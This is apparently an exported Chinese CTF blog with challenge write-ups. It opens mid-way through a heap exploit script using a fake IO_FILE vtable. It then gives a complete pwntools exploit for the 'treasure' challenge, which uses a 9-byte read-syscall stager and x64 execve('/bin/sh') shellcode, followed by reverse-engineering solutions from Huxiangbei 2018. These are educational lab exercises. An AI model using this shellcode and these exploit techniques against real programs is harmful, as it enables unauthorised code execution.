Fake vtable attack =======</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">fake_file = IO_FILE._IO_FILE_plus()</span><br><span class="line">fake_file._IO_write_ptr = 1</span><br><span class="line">fake_file.vtable = heap_addr + 0xe0</span><br><span class="line">fake_file._lock = heap_addr + 0x2000</span><br><span class="line">payload4 = fake_file.tostr() + p64(0) + p64(one_gadget) * 0x20</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">sleep(0.1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(&quot;0&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<h3 id="4-treasure"><a href="#4-treasure" class="headerlink" title="4. treasure"></a>4. treasure</h3><p>本题有点意思，第一个函数的代码：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">void *settreasure()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  int v1; // ST0C_4</span><br><span class="line"></span><br><span class="line">  sea = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);</span><br><span class="line">  code = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v1 = rand() % 900;</span><br><span class="line">  memcpy((sea + v1), &quot;TREASURE&quot;, 8uLL);</span><br><span class="line">  memcpy((sea + v1), &amp;shellcode, 38uLL);</span><br><span class="line">  return memset(&amp;shellcode, 0, 0x25uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用 mmap 在一个随机的地址分配了空间，然后把一段 shellcode 拷贝到新分配的空间中，随后清除原来的 shellcode。<br>第二个函数：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 treasure()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *v0)(); // rsi</span><br><span class="line">  void *v1; // rsi</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  puts(&quot;Do you want my treasure? Find them yourself! It&#x27;s shellcode!\n&quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v0 = 10;</span><br><span class="line">  make_code_executable(code, 10);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;, v0);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    v1 = code;</span><br><span class="line">    read(0, code, 1uLL);</span><br><span class="line">    result = *code;</span><br><span class="line">    if ( result == &#x27;n&#x27; )</span><br><span class="line">      break;</span><br><span class="line">    getchar();</span><br><span class="line">    printf(&quot;start!!!!&quot;, v1);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    v0 = 9;</span><br><span class="line">    getsn(code + 1, 9u);</span><br><span class="line">    if ( !*(code + 10) )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = nullsub_1;</span><br><span class="line">      memcpy(code + 10, nullsub_1, 1uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = ((code + 1))(ret, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是程序的主要逻辑，简单的说就是一次可以执行不大于 9 个字节的任意代码，要求在这种情况下拿到 shell。<br>保护只开了 NX。  </p>
<p>这道题在比赛的时候想了很多做法，但是都失败了，现在回想原因是掉进了出题人的坑里面，总是先要找办法命中出题人的 shellcode，但实际上，我们可以利用这 9 个字节来做一个系统调用，read 自己的 shellcode。 </p>
<p>首先，要通过动态调试来看看在跳转到 9 字节 shellcode 时，环境是怎样的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-7.png"
                      alt="image"
                > </p>
<p>寄存器方面，有用的地址在 RDX 中，里面存储着 shellcode 的地址，且位于可读可写可执行段。<br>栈上没有什么有用的地址，所以，我们就利用 RDX 构造 read 系统调用。<br>首先在网上找一下 64 位 linux 的系统调用表，发现 0 号 syscall 就是 read<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-8.png"
                      alt="image"
                > </p>
<p>根据参数表，可以写出以下汇编，来满足 syscall 的要求</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rdx</span><br><span class="line">pop rsi</span><br><span class="line">push 100</span><br><span class="line">pop rdx</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>

<p>这几句汇编转换成机器码之后的长度是 8 个字节，满足要求，实现的功能是向 RWX 段写入自己的 shellcode。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-9.png"
                      alt="image"
                ></p>
<p>接下来就是构造真正的 shellcode 了，如果直接把 shellcode 写上去的话，会发现程序直接崩溃退出，原因是修改了正在执行中的代码，rip 指向了机器码中的一个非法位置，从而抛出异常。<br>所以，我们需要给 shellcode 添加一点前缀，加上一些 \x90，这样，rip 就会命中一堆 nop ，从而正确的执行到 shellcode(又叫做雪橇攻击)。</p>
<p>脚本</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">p = process(&quot;./treasure&quot;)</span><br><span class="line">p.recvuntil(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;)</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line">p.recvuntil(&quot;start!!!!&quot;)</span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">                 push rdx</span><br><span class="line">                 pop rsi</span><br><span class="line">                 push 100</span><br><span class="line">                 pop rdx</span><br><span class="line">                 syscall</span><br><span class="line">                 ret</span><br><span class="line">                 &#x27;&#x27;&#x27;)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">shellcode_x64 = &#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line">print(len(shellcode_x64))</span><br><span class="line">p.sendline(shellcode_x64)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>湖湘杯 2018 线上赛部分题目复现</title>
    <url>/2018/11/20/hxb-2018-online/</url>
    <content><![CDATA[<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="1-Replace"><a href="#1-Replace" class="headerlink" title="1. Replace"></a>1. Replace</h3><p>程序给加了 UPX 的壳，直接在 linux 下面脱掉，注意脱完壳的程序就不能正常运行了。<br>脱了壳直接丢到 IDA 里面去看，逻辑很清晰，主函数只有一点点代码</p>
<span id="more"></span>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">char</span> Buf; <span class="comment">// [esp+4h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> Dst; <span class="comment">// [esp+5h] [ebp-2Bh]</span></span><br><span class="line"></span><br><span class="line">  Buf = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x27</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome The System\nPlease Input Key:&quot;</span>);</span><br><span class="line">  gets_s(&amp;Buf, <span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;Buf);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 - <span class="number">35</span>) &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401090(&amp;Buf, v3) == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Well Done!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your Wrong!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>关键函数是 sub_401090，如果对加密算法熟悉的话很容易可以看出来这是 AES 加密，给出了密钥和密文，那直接写解密脚本就行。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">target = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">199</span>, <span class="number">35</span>, <span class="number">195</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">5</span>, <span class="number">154</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, <span class="number">235</span>, <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>, <span class="number">9</span>, <span class="number">131</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">110</span>, <span class="number">90</span>, <span class="number">160</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">41</span>, <span class="number">227</span>, <span class="number">47</span>, <span class="number">132</span>, <span class="number">83</span>, <span class="number">209</span>, <span class="number">0</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, <span class="number">190</span>, <span class="number">57</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">69</span>, <span class="number">249</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">159</span>, <span class="number">168</span>, <span class="number">81</span>, <span class="number">163</span>, <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>, <span class="number">56</span>, <span class="number">245</span>, <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>, <span class="number">61</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">115</span>, <span class="number">96</span>, <span class="number">129</span>, <span class="number">79</span>, <span class="number">220</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">144</span>, <span class="number">136</span>, <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">219</span>, <span class="number">224</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, <span class="number">172</span>, <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>, <span class="number">55</span>, <span class="number">109</span>, <span class="number">141</span>, <span class="number">213</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, <span class="number">174</span>, <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>, <span class="number">37</span>, <span class="number">46</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>, <span class="number">62</span>, <span class="number">181</span>, <span class="number">102</span>, <span class="number">72</span>, <span class="number">3</span>, <span class="number">246</span>, <span class="number">14</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">87</span>, <span class="number">185</span>, <span class="number">134</span>, <span class="number">193</span>, <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>, <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>, <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">223</span>, <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>, <span class="number">66</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">153</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">176</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">22</span>, <span class="number">72</span>]</span><br><span class="line">token = [<span class="number">50</span>, <span class="number">97</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">57</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">54</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">54</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">102</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">48</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">54</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">35</span>:</span><br><span class="line">    <span class="keyword">for</span> flag <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        v6 = (flag &gt;&gt; <span class="number">4</span>) % <span class="number">16</span></span><br><span class="line">        v7 = (<span class="number">16</span> * flag &gt;&gt; <span class="number">4</span>) % <span class="number">16</span></span><br><span class="line">        v8 = token[<span class="number">2</span> * i]</span><br><span class="line">        <span class="keyword">if</span> (v8 &lt; <span class="number">48</span> <span class="keyword">or</span> v8 &gt; <span class="number">57</span>):</span><br><span class="line">            v9 = v8 - <span class="number">87</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v9 = v8 - <span class="number">48</span></span><br><span class="line">        v10 = token[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">        v11 = <span class="number">16</span> * v9</span><br><span class="line">        <span class="keyword">if</span> (v10 &lt; <span class="number">48</span> <span class="keyword">or</span> v10 &gt; <span class="number">57</span>):</span><br><span class="line">            v12 = v10 - <span class="number">87</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v12 = v10 - <span class="number">48</span></span><br><span class="line">        <span class="keyword">if</span> target[<span class="number">16</span> * v6 + v7] == (v11 + v12) ^ <span class="number">0x19</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(flag))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"><span class="comment"># flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag : flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</p>
<h3 id="2-Highwayhash"><a href="#2-Highwayhash" class="headerlink" title="2. Highwayhash"></a>2. Highwayhash</h3><p>上网找找 highwayhash，在 github 上面找到了它，是 google 优化现有 hash 算法的一个项目，看看源代码发现和反汇编的结果很相似，应该是出题人拿源码直接修改的(事实证明只修改了 HighwayHashReset 函数里面的一些东西)，不同的地方是 key。<br>回头继续看伪代码，有一个提示：<strong>Please enter flag(Note:hxb2018{digital}:</strong> ， flag 的格式应该是 hxb2018{纯数字}，接着是调用了两次 hash，第一次加密了 flag 的长度，第二次加密的 flag 的内容(刨除 hxb2018{} 外壳)，两次加密都只给出了 hash 的结果。<br>想要算出第一个 hash 比较简单，直接动态调试 + 手动爆破就可以，最后算出的 flag 长度是 19，除去 flag 的外壳纯数字的部分只有 10 位，也就是说 flag 的可能性有 10^10 &#x3D; 一百亿个<br>不算太多，应该可以爆破出来，这道题简单的思路有两种，第一个是把 github 上面的源代码拖下来，修改一下直接爆破，另一个是调程序里面的函数，需要先修改一下 PE 头，然后编写另一个程序，把这道题当做 dll 加载。<br>第一种方法：克隆 github 上面的代码，key 什么的就不需要管了，修改好代码之后去爆破，先把 highwayhash.c 里面的 HighwayHashReset 函数修改成</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">HighwayHashReset</span><span class="params">(<span class="type">const</span> <span class="type">uint64_t</span> key[<span class="number">4</span>], HighwayHashState* state)</span> &#123;</span><br><span class="line">  state-&gt;mul0[<span class="number">0</span>] = <span class="number">0x1BE6D5D5FE4CCE2F</span>;</span><br><span class="line">  state-&gt;mul0[<span class="number">1</span>] = <span class="number">0x24093822299F31D0</span>;</span><br><span class="line">  state-&gt;mul0[<span class="number">2</span>] = <span class="number">0x33198A2E03707344</span>;</span><br><span class="line">  state-&gt;mul0[<span class="number">3</span>] = <span class="number">0x443F6A8885A308D3</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">0</span>] = <span class="number">0x5BD39E10CB0EF593</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">1</span>] = <span class="number">0x60ACF169B5F18A8C</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">2</span>] = <span class="number">0x7E5466CF34E90C6C</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">3</span>] = <span class="number">0x852821E638D01377</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">0</span>] = <span class="number">0xCF0C0C1ED5EDF3E</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">1</span>] = state-&gt;mul0[<span class="number">1</span>] ^ <span class="number">0x3F3E3D3C3B3A1918</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">2</span>] = state-&gt;mul0[<span class="number">2</span>] ^ <span class="number">0x1226252423222121</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">3</span>] = state-&gt;mul0[<span class="number">3</span>] ^ <span class="number">0x2F2E2D2C2B2A2928</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">0</span>] = state-&gt;mul1[<span class="number">0</span>] ^ <span class="number">0x1312111117161514</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">1</span>] = state-&gt;mul1[<span class="number">1</span>] ^ <span class="number">0x3B3A19183F3E3D3C</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">2</span>] = state-&gt;mul1[<span class="number">2</span>] ^ <span class="number">0x2322212112262524</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">3</span>] = state-&gt;mul1[<span class="number">3</span>] ^ <span class="number">0x2B2A29282F2E2D2C</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后另写一份代码(可以参考给出的 highwayhash_test.c 来写)，先拿长度测试一下修改的是否正确：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// g++ 0.c highwayhash.c -o test -O3</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;highwayhash.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> data[<span class="number">4</span>]=&#123;<span class="number">19</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%llx&quot;</span>,HighwayHash64(data, <span class="number">4</span>, key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意要用 <strong>g++ 0.c highwayhash.c -o test -O3</strong> 进行联合编译，开启 3 级优化。<br>然后运行代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online1.png"
                      alt="image"
                ></p>
<p>结果正确，现在就可以开始爆破了。</p>
<p>借用大佬的代码(<a class="link"   href="https://blog.csdn.net/uiop_uiop_uiop/article/details/84207231" >链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;highwayhash.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> data[<span class="number">11</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">uint8_t</span> v1=<span class="string">&#x27;9&#x27;</span>;v1&gt;=<span class="string">&#x27;0&#x27;</span>;v1--)&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">uint8_t</span> v2=<span class="string">&#x27;9&#x27;</span>;v2&gt;=<span class="string">&#x27;0&#x27;</span>;v2--)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">uint8_t</span> v3=<span class="string">&#x27;9&#x27;</span>;v3&gt;=<span class="string">&#x27;0&#x27;</span>;v3--)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">uint8_t</span> v4=<span class="string">&#x27;9&#x27;</span>;v4&gt;=<span class="string">&#x27;0&#x27;</span>;v4--)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">uint8_t</span> v5=<span class="string">&#x27;9&#x27;</span>;v5&gt;=<span class="string">&#x27;0&#x27;</span>;v5--)&#123;</span><br><span class="line">					<span class="keyword">for</span>(<span class="type">uint8_t</span> v6=<span class="string">&#x27;9&#x27;</span>;v6&gt;=<span class="string">&#x27;0&#x27;</span>;v6--)&#123;</span><br><span class="line">						<span class="keyword">for</span>(<span class="type">uint8_t</span> v7=<span class="string">&#x27;9&#x27;</span>;v7&gt;=<span class="string">&#x27;0&#x27;</span>;v7--)&#123;</span><br><span class="line">							<span class="keyword">for</span>(<span class="type">uint8_t</span> v8=<span class="string">&#x27;9&#x27;</span>;v8&gt;=<span class="string">&#x27;0&#x27;</span>;v8--)&#123;</span><br><span class="line">								<span class="keyword">for</span>(<span class="type">uint8_t</span> v9=<span class="string">&#x27;9&#x27;</span>;v9&gt;=<span class="string">&#x27;0&#x27;</span>;v9--)&#123;</span><br><span class="line">									<span class="keyword">for</span>(<span class="type">uint8_t</span> v10=<span class="string">&#x27;9&#x27;</span>;v10&gt;=<span class="string">&#x27;0&#x27;</span>;v10--)&#123;</span><br><span class="line">										data[<span class="number">0</span>]=v1;</span><br><span class="line">										data[<span class="number">1</span>]=v2;</span><br><span class="line">										data[<span class="number">2</span>]=v3;</span><br><span class="line">										data[<span class="number">3</span>]=v4;</span><br><span class="line">										data[<span class="number">4</span>]=v5;</span><br><span class="line">										data[<span class="number">5</span>]=v6;</span><br><span class="line">										data[<span class="number">6</span>]=v7;</span><br><span class="line">										data[<span class="number">7</span>]=v8;</span><br><span class="line">										data[<span class="number">8</span>]=v9;</span><br><span class="line">										data[<span class="number">9</span>]=v10;</span><br><span class="line">                                        <span class="comment">//printf(&quot;NOW : %s  \n&quot;, data);</span></span><br><span class="line">										<span class="keyword">if</span>(HighwayHash64(data, <span class="number">10</span>, key) == <span class="number">0x7CDCCF71350B7DB8</span>)&#123;</span><br><span class="line">											<span class="built_in">puts</span>((<span class="type">char</span> *)data);</span><br><span class="line">                                                                                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">										&#125;</span><br><span class="line">										</span><br><span class="line">  &#125;    &#125;    &#125;    &#125;    &#125;    &#125;    &#125;    &#125;    &#125;  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这是反向爆破的，比正向爆破节省一些时间，大概 10 分钟左右跑出了答案：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online2.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online3.png"
                      alt="image"
                ></p>
<p>第二种方法：修改 exe，使用另外一个程序加载，调用程序自己的 hash 函数，直接加载当然是不行的，这和 PE 的结构有关系，首先使用十六进制编辑器编辑源文件，推荐使用 010，找到 PE 头中的 NtHeader –&gt; Characteristics –&gt; IMAGE_FILE_DLL 这个字段，修改为 1，这样就能把这个程序当做 DLL 调用了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online4.png"
                      alt="image"
                ></p>
<p>修改之后的效果，再次双击这个程序不能运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online5.png"
                      alt="image"
                ></p>
<p>现在还有两个问题需要解决。</p>
<p>第一个问题，仅仅修改了 IMAGE_FILE_DLL 并不能直接使用这个文件，还需要修改程序的入口点(基地址)，由于 EXE 不存在导出表，所以我们在调用内部函数的时候需要根据 EXE 的 RVA 加上基地址才能找到对应的函数，RVA(即相对虚拟地址)可以使用 IDA 查看，修改入口点可以使用工具 PE Editor。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online7.png"
                      alt="image"
                ></p>
<p>然后就可以使用这个 “DLL” 了！  </p>
